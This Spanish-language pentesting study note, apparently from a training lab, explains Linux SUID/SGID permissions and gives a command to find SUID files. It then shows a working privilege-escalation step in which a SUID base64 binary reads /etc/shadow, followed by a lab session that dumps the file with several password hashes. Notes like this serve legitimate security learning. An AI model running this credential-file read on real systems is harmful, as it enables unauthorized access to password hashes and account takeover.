# SUID

Gran parte de los controles de privilegios de Linux se basan en controlar las interacciones de los usuarios y los archivos. Esto se hace con permisos. A estas alturas ya sabes que los archivos pueden tener permisos de lectura, escritura y ejecución. Estos se otorgan a los usuarios dentro de sus niveles de privilegio. Esto cambia con SUID (Establecer identificación de usuario) y SGID (Establecer identificación de grupo). Estos permiten que los archivos se ejecuten con el nivel de permiso del propietario del archivo o del propietario del grupo, respectivamente.

Notarás que estos archivos tienen un bit "s" configurado que muestra su nivel de permiso especial.

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/20231008154240.png" alt=""><figcaption></figcaption></figure>

### Ejemplo

El binario que se puede hacer uso es:

```bash
/usr/bin/base64
```

<pre class="language-shell"><code class="lang-shell"><strong>1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
</strong>
</code></pre>

Con este binario se puede leer archivos donde se alamacena credenciales, lo cual permite que leer el \`/etc/shadow\`

```shell
sudo install -m =xs $(which base64) .

LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```

```shell
karen@ip-10-10-252-158:/home/ubuntu$ LFILE=/etc/shadow
karen@ip-10-10-252-158:/home/ubuntu$ base64 "$LFILE"| base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
karen@ip-10-10-252-158:/home/ubuntu$ 
```
